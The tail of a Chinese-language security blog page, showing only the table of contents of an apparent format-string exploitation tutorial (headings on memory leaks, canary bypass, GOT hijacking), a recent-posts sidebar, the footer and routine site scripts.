class="toc-text">格式化字符串函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-text">格式化字符串函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-text">参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-text">函数特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E4%B8%80%EF%BC%9A-printf-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E4%B8%8D%E5%9B%BA%E5%AE%9A"><span class="toc-text">特性一： printf()函数的参数个数不固定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8-n%E6%A0%BC%E5%BC%8F%E7%AC%A6%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">特性二：利用%n格式符写入数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E4%B8%89%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%BD%E5%BA%A6"><span class="toc-text">特性三：自定义打印字符串宽度</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞利用原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">漏洞利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="toc-text">1. 程序崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-text">2. 泄露栈内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E6%95%B0%E5%80%BC"><span class="toc-text">获取栈变量数值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E5%AF%B9%E5%BA%94%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">获取栈变量对应字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-text">泄露任意地址内存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98"><span class="toc-text">3. 覆盖内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="toc-text">覆盖栈内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-text">覆盖任意地址内存</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖小数字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-text">覆盖大数字</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B-1-x64"><span class="toc-text">例(1) x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B-2-%E7%BB%95%E8%BF%87Canary"><span class="toc-text">例(2) 绕过Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E6%9C%89%E4%B8%80%E9%81%93%E9%A2%98%E5%BC%80%E5%90%AF%E4%BA%86canary%E4%BF%9D%E6%8A%A4%EF%BC%8C%E4%BD%86%E4%B8%8D%E7%9F%A5%E9%81%93canary%E7%9A%84%E5%80%BC%EF%BC%8C%E5%B0%B1%E4%B8%8D%E8%83%BD%E5%A4%9F%E8%BF%9B%E8%A1%8CROP%E6%9D%A5%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E9%81%93%E9%A2%98%E5%B0%B1%E6%97%A0%E6%B3%95%E8%A7%A3%E5%86%B3%E4%BA%86%E3%80%82"><span class="toc-text">所以如果有一道题开启了canary保护，但不知道canary的值，就不能够进行ROP来劫持程序流程，那么这道题就无法解决了。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E9%87%87%E7%94%A8%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9Aprintf%E5%B1%9E%E4%BA%8E%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%EF%BC%8C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%80%85%E5%8F%AF%E4%BB%BB%E6%84%8F%E6%8C%87%E5%AE%9A%E5%8F%82%E6%95%B0%E5%92%8C%E6%95%B0%E9%87%8F%EF%BC%8C%E8%BF%99%E4%B9%9F%E6%98%AF%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0%E3%80%82"><span class="toc-text">这里我们采用第二种利用方法：printf属于可变参数函数，函数调用者可任意指定参数和数量，这也是漏洞产生的原因。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B-3-hijack-GOT"><span class="toc-text">例(3) hijack GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-text">实操</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">查看文件执行流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getshell%E6%80%9D%E8%B7%AF"><span class="toc-text">getshell思路</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB"><span class="toc-text">确定格式化字符串偏移</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2puts%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">泄露puts函数地址</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%BEsystem%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">找system函数地址</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%A6%86%E7%9B%96puts%E5%87%BD%E6%95%B0"><span class="toc-text">覆盖puts函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cdir%E5%90%8Egetshell"><span class="toc-text">执行dir后getshell</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9E%E9%A1%BE%E6%80%9D%E8%B7%AF"><span class="toc-text">回顾思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/17/yi-dong-Binary/" title="江苏移动“赋能建功”-二进制相关"><img src="/img/loading.gif" data-original="/img/fengmian3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="江苏移动“赋能建功”-二进制相关"/></a><div class="content"><a class="title" href="/2025/09/17/yi-dong-Binary/" title="江苏移动“赋能建功”-二进制相关">江苏移动“赋能建功”-二进制相关</a><time datetime="2025-09-17T10:01:08.000Z" title="发表于 2025-09-17 18:01:08">2025-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/13/Cobalt-Strike/" title="Cobalt_Strike 无 .cobaltstrike.beacon_keys 流量解密"><img src="/img/loading.gif" data-original="/img/fengmian3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt_Strike 无 .cobaltstrike.beacon_keys 流量解密"/></a><div class="content"><a class="title" href="/2025/09/13/Cobalt-Strike/" title="Cobalt_Strike 无 .cobaltstrike.beacon_keys 流量解密">Cobalt_Strike 无 .cobaltstrike.beacon_keys 流量解密</a><time datetime="2025-09-13T05:47:00.000Z" title="发表于 2025-09-13 13:47:00">2025-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/30/ret2all/" title="「ret2all」有关栈的一切"><img src="/img/loading.gif" data-original="/img/fengmian3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="「ret2all」有关栈的一切"/></a><div class="content"><a class="title" href="/2025/08/30/ret2all/" title="「ret2all」有关栈的一切">「ret2all」有关栈的一切</a><time datetime="2025-08-30T10:58:13.000Z" title="发表于 2025-08-30 18:58:13">2025-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/28/JSDSC-final-RE/" title="江苏省数据安全技术应用职业技能竞赛决赛_逆向WP"><img src="/img/loading.gif" data-original="/img/fengmian3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="江苏省数据安全技术应用职业技能竞赛决赛_逆向WP"/></a><div class="content"><a class="title" href="/2025/08/28/JSDSC-final-RE/" title="江苏省数据安全技术应用职业技能竞赛决赛_逆向WP">江苏省数据安全技术应用职业技能竞赛决赛_逆向WP</a><time datetime="2025-08-28T03:33:59.000Z" title="发表于 2025-08-28 11:33:59">2025-08-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/17/Key_Points_for_Computer_Network_Exam/" title="《计算机网络》期末大题&amp;名词解释&amp;相关习题（自用）"><img src="/img/loading.gif" data-original="/img/fengmian2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《计算机网络》期末大题&amp;名词解释&amp;相关习题（自用）"/></a><div class="content"><a class="title" href="/2025/06/17/Key_Points_for_Computer_Network_Exam/" title="《计算机网络》期末大题&amp;名词解释&amp;相关习题（自用）">《计算机网络》期末大题&amp;名词解释&amp;相关习题（自用）</a><time datetime="2025-06-16T16:33:09.000Z" title="发表于 2025-06-17 00:33:09">2025-06-17</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Zechariah</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>